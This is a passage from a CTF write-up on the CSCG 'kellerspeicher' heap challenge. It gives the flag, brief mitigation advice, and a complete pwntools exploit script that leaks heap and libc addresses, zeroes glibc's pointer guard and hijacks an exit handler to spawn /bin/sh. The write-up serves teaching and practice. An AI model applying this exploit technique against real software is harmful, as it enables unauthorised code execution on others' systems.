<pre data-role="codeBlock" data-info="c" class="language-c c"><code><span class="token keyword keyword-struct">struct</span> <span class="token class-name">exit_function</span> rce <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token punctuation">.</span>flavor <span class="token operator">=</span> ef_cxa<span class="token punctuation">,</span>
        <span class="token punctuation">.</span>func<span class="token punctuation">.</span>cxa <span class="token operator">=</span>  <span class="token punctuation">{</span>
            <span class="token punctuation">.</span>fn <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword keyword-void">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword keyword-void">void</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword keyword-int">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">rol</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword keyword-long">long</span><span class="token punctuation">)</span>system<span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token punctuation">.</span>arg <span class="token operator">=</span> <span class="token string">"/bin/sh"</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre><p>or using pwntools in python:</p>
<pre data-role="codeBlock" data-info="python" class="language-python python"><code>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>
    p64<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment"># ef_cxa</span>
    p64<span class="token punctuation">(</span>rol<span class="token punctuation">(</span>system_addr<span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    p64<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span>
<span class="token punctuation">)</span>
</code></pre><h2 id="flag">Flag </h2>
<p><code>CSCG{einkellern_auskellern_umkellern_unterkellern__kellerspeicher_machen_spass}</code></p>
<h2 id="mitigations">Mitigations </h2>
<p>The simple mitigation is to remove the <code>unterkellern</code> functionality. As this functionality is likely there to simplify the challenge and simulates an actual bug, we also need to consider, how to avoid the underlying bug.</p>
<p>One solution would be to always perform a bounds check after modifying a GC allocated pointer. But this is likely going to be slow, requires extra effort by the developer and makes the code harder to read, which in turn allows other bugs to slip through code review. So, not a good option.</p>
<p>As always with code, the best practices regarding</p>
<ul>
<li>Clean code,</li>
<li>Code reviews and</li>
<li>Fuzzing</li>
</ul>
<p>can prevent most of those bugs.</p>
<p>An even better option, is to use memory safe languages like Rust.</p>
<p>TL;DR: As always with C: Memory safety management is the key.</p>
<h2 id="exploit---script">Exploit - Script </h2>
<pre data-role="codeBlock" data-info="python" class="language-python python"><code><span class="token keyword keyword-from">from</span> pwn <span class="token keyword keyword-import">import</span> <span class="token operator">*</span>

<span class="token comment"># local</span>
<span class="token comment"># p = remote("localhost", 1024)</span>

<span class="token comment"># remote</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"&lt;session-id&gt;-1024-kellerspeicher.challenge.cscg.live"</span><span class="token punctuation">,</span> <span class="token number">1337</span><span class="token punctuation">,</span> ssl<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>

<span class="token comment">### wrappers ###</span>
<span class="token keyword keyword-def">def</span> <span class="token function">create_haupt</span><span class="token punctuation">(</span>size<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"Wahl: "</span><span class="token punctuation">,</span> <span class="token string">b"1"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Größe des Kellers:"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword keyword-def">def</span> <span class="token function">create_neben</span><span class="token punctuation">(</span>size<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"Wahl: "</span><span class="token punctuation">,</span> <span class="token string">b"2"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Größe des Kellers:"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword keyword-def">def</span> <span class="token function">create_neben_str</span><span class="token punctuation">(</span>size<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>
    <span class="token keyword keyword-return">return</span> <span class="token string">b"2\n"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b"\n"</span>

<span class="token keyword keyword-def">def</span> <span class="token function">del_haupt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"Wahl: "</span><span class="token punctuation">,</span> <span class="token string">b"3"</span><span class="token punctuation">)</span>

<span class="token keyword keyword-def">def</span> <span class="token function">del_neben</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"Wahl: "</span><span class="token punctuation">,</span> <span class="token string">b"4"</span><span class="token punctuation">)</span>

<span class="token keyword keyword-def">def</span> <span class="token function">del_neben_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
    <span class="token keyword keyword-return">return</span> <span class="token string">b"4\n"</span>

<span class="token keyword keyword-def">def</span> <span class="token function">push_haupt</span><span class="token punctuation">(</span>elem<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword keyword-assert">assert</span><span class="token punctuation">(</span>elem <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token keyword keyword-and">and</span> elem <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"Wahl: "</span><span class="token punctuation">,</span> <span class="token string">b"5"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"Geben sie das element in hexadezimal notation an: "</span><span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>elem<span class="token punctuation">:</span><span class="token format-spec">02x</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword keyword-def">def</span> <span class="token function">push_haupt_str</span><span class="token punctuation">(</span>elem<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>
    <span class="token keyword keyword-assert">assert</span><span class="token punctuation">(</span>elem <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token keyword keyword-and">and</span> elem <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">)</span>
    <span class="token keyword keyword-return">return</span> <span class="token string">b"5\n"</span> <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>elem<span class="token punctuation">:</span><span class="token format-spec">02x</span><span class="token punctuation">}</span></span><span class="token string">\n"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword keyword-def">def</span> <span class="token function">push_neben</span><span class="token punctuation">(</span>elem<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword keyword-assert">assert</span><span class="token punctuation">(</span>elem <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token keyword keyword-and">and</span> elem <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"Wahl: "</span><span class="token punctuation">,</span> <span class="token string">b"6"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"Geben sie das element in hexadezimal notation an: "</span><span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>elem<span class="token punctuation">:</span><span class="token format-spec">02x</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword keyword-def">def</span> <span class="token function">pop_haupt</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">int</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"Wahl: "</span><span class="token punctuation">,</span> <span class="token string">b"7"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Element: "</span><span class="token punctuation">)</span>
    <span class="token keyword keyword-return">return</span> <span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>

<span class="token keyword keyword-def">def</span> <span class="token function">pop_neben</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">int</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"Wahl: "</span><span class="token punctuation">,</span> <span class="token string">b"8"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Element: "</span><span class="token punctuation">)</span>
    <span class="token keyword keyword-return">return</span> <span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>

<span class="token keyword keyword-def">def</span> <span class="token function">transfer_haupt_neben</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"Wahl:"</span><span class="token punctuation">,</span> <span class="token string">b"9"</span><span class="token punctuation">)</span>

<span class="token keyword keyword-def">def</span> <span class="token function">transfer_neben_haupt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"Wahl:"</span><span class="token punctuation">,</span> <span class="token string">b"10"</span><span class="token punctuation">)</span>

<span class="token keyword keyword-def">def</span> <span class="token function">unterkellern</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"Wahl:"</span><span class="token punctuation">,</span> <span class="token string">b"11"</span><span class="token punctuation">)</span>

<span class="token keyword keyword-def">def</span> <span class="token function">do_exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"Wahl:"</span><span class="token punctuation">,</span> <span class="token string">b"12"</span><span class="token punctuation">)</span>

<span class="token comment">### Wrappers for batch processing to speed up exploit ###</span>
<span class="token keyword keyword-def">def</span> <span class="token function">push_haupt_batch</span><span class="token punctuation">(</span>elem_list<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token builtin">buffer</span> <span class="token operator">=</span> <span class="token string">b""</span>
    <span class="token keyword keyword-for">for</span> elem <span class="token keyword keyword-in">in</span> elem_list<span class="token punctuation">:</span>
        <span class="token builtin">buffer</span> <span class="token operator">+=</span> push_haupt_str<span class="token punctuation">(</span>elem<span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">buffer</span><span class="token punctuation">)</span>

<span class="token keyword keyword-def">def</span> <span class="token function">gc_thrashing</span><span class="token punctuation">(</span>num_objects<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> obj_size<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token builtin">buffer</span> <span class="token operator">=</span> <span class="token string">b""</span>
    <span class="token keyword keyword-for">for</span> _ <span class="token keyword keyword-in">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>num_objects<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token builtin">buffer</span> <span class="token operator">+=</span> create_neben_str<span class="token punctuation">(</span>obj_size<span class="token punctuation">)</span> <span class="token operator">+</span> del_neben_str<span class="token punctuation">(</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">buffer</span><span class="token punctuation">)</span>

<span class="token comment"># whole page, no alignment issues</span>
haupt_size <span class="token operator">=</span> <span class="token number">0x1000</span>

<span class="token comment"># sizeof(Keller)</span>
neben_size <span class="token operator">=</span> <span class="token number">0x20</span>

<span class="token comment"># create main stack and overflow the elements pointer</span>
create_haupt<span class="token punctuation">(</span>haupt_size <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
unterkellern<span class="token punctuation">(</span><span class="token punctuation">)</span>
push_haupt_batch<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> haupt_size<span class="token punctuation">)</span>

<span class="token comment"># 1834 was determined empirically</span>
gc_thrashing<span class="token punctuation">(</span><span class="token number">1834</span><span class="token punctuation">,</span> neben_size <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>

<span class="token comment"># put chunk into hauptkeller-&gt;elements</span>
create_neben<span class="token punctuation">(</span>neben_size <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>

<span class="token keyword keyword-for">for</span> _ <span class="token keyword keyword-in">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x40</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    pop_haupt<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># leak GC heap base address</span>
gc_heap_base <span class="token operator">=</span> <span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span>pop_haupt<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword keyword-for">for</span> i <span class="token keyword keyword-in">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x11fc0</span>
libc_base <span class="token operator">=</span> gc_heap_base <span class="token operator">+</span> <span class="token number">0x53000</span>
<span class="token keyword keyword-print">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"gc_heap_base = </span><span class="token interpolation"><span class="token punctuation">{</span>gc_heap_base<span class="token punctuation">:</span><span class="token format-spec">#x</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token keyword keyword-print">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"libc_base = </span><span class="token interpolation"><span class="token punctuation">{</span>libc_base<span class="token punctuation">:</span><span class="token format-spec">#x</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

<span class="token keyword keyword-def">def</span> <span class="token function">overwrite_neben_elem_ptr</span><span class="token punctuation">(</span>new_addr<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword keyword-for">for</span> b <span class="token keyword keyword-in">in</span> new_addr<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">"little"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        push_haupt<span class="token punctuation">(</span>b<span class="token punctuation">)</span>

<span class="token comment"># overwrite neben-&gt;elements with address of pointer guard</span>
pointer_guard_addr <span class="token operator">=</span> gc_heap_base <span class="token operator">+</span> <span class="token number">0x50740</span> <span class="token operator">+</span> <span class="token number">0x30</span>
<span class="token keyword keyword-print">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"pointer_guard_addr = </span><span class="token interpolation"><span class="token punctuation">{</span>pointer_guard_addr<span class="token punctuation">:</span><span class="token format-spec">#x</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
overwrite_neben_elem_ptr<span class="token punctuation">(</span>pointer_guard_addr<span class="token punctuation">)</span>

<span class="token comment"># zero out pointer guard</span>
<span class="token keyword keyword-for">for</span> _ <span class="token keyword keyword-in">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    push_neben<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

<span class="token comment"># overwrite neben-&gt;elements with address of &amp;__exit_funcs[0]-&gt;fns[0]</span>
exit_funcs_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x204fd0</span>
<span class="token keyword keyword-for">for</span> _ <span class="token keyword keyword-in">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    pop_haupt<span class="token punctuation">(</span><span class="token punctuation">)</span>
overwrite_neben_elem_ptr<span class="token punctuation">(</span>exit_funcs_addr<span class="token punctuation">)</span>

<span class="token comment"># overwrite benutzt und frei</span>
<span class="token keyword keyword-for">for</span> b <span class="token keyword keyword-in">in</span> flat<span class="token punctuation">(</span>
    p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span><span class="token punctuation">:</span>
    push_haupt<span class="token punctuation">(</span>b<span class="token punctuation">)</span>

<span class="token keyword keyword-def">def</span> <span class="token function">rotate_left</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span> rotate_by<span class="token punctuation">,</span> bit_size<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">""" following function is presented by out lord and saviour ChatGPT """</span>
    rotate_by <span class="token operator">%=</span> bit_size  <span class="token comment"># Ensure rotation value is within the bit size</span>
    <span class="token keyword keyword-return">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>num <span class="token operator">&lt;&lt;</span> rotate_by<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>num <span class="token operator">&gt;&gt;</span> <span class="token punctuation">(</span>bit_size <span class="token operator">-</span> rotate_by<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> bit_size<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>

<span class="token keyword keyword-def">def</span> <span class="token function">mangle_ptr</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> ptr_guard<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword keyword-return">return</span> rotate_left<span class="token punctuation">(</span>ptr <span class="token operator">^</span> ptr_guard<span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>

<span class="token comment"># overwrite exit function with system("/bin/sh")</span>
system <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x58740</span>
bin_sh <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x1cb42f</span>
exit_fn_payload <span class="token operator">=</span> flat<span class="token punctuation">(</span>
    p64<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    p64<span class="token punctuation">(</span>mangle_ptr<span class="token punctuation">(</span>system<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span>
<span class="token keyword keyword-for">for</span> b <span class="token keyword keyword-in">in</span> exit_fn_payload<span class="token punctuation">:</span>
    push_neben<span class="token punctuation">(</span>b<span class="token punctuation">)</span>

<span class="token comment"># trigger RCE</span>
do_exit<span class="token punctuation">(</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"cat flag"</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
      </div>
      
      
    
    
    
    
    
    
  
    </body></html>